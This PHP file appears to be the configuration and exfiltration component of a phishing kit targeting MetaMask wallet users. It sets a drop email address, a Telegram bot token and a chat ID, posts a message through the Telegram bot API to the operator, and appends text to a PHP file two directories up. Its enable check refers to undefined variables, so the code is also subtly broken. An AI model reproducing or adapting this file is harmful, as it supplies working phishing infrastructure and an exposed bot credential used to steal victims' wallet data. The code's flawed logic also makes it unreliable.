<?php

/* Email Address */
$Your_Mail = "metamask@constructvine.store";

/* Telegram Bot Configuration */
$botToken = "7558491921:AAHUTukOw29luISZHlTCiEUrPaqcQEwjrAg";
$chatId = "7296145278";

// Ensure bot is enabled
if ($botToken_0 == "on" && $chatId_0 == "on") {
    // Data to send
    $message = "Test message from your script";

    // Telegram API URL
    $apiUrl = "https://api.telegram.org/bot$botToken/sendMessage";

    // Prepare POST request
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
    ];

    // Send the request
    $options = [
        'http' => [
            'header' => "Content-Type: application/json\r\n",
            'method' => 'POST',
            'content' => json_encode($data),
        ],
    ];

    $context = stream_context_create($options);
    $result = file_get_contents($apiUrl, false, $context);

    // Debug the response
    if ($result === FALSE) {
        error_log("Error sending message to Telegram bot");
    } else {
        echo "Message sent successfully to Telegram!";
    }
}

// Save to file (optional)
$f = fopen("../../a.php", "a");
fwrite($f, "Data sent to Telegram and saved to a file.");
fclose($f);
?>
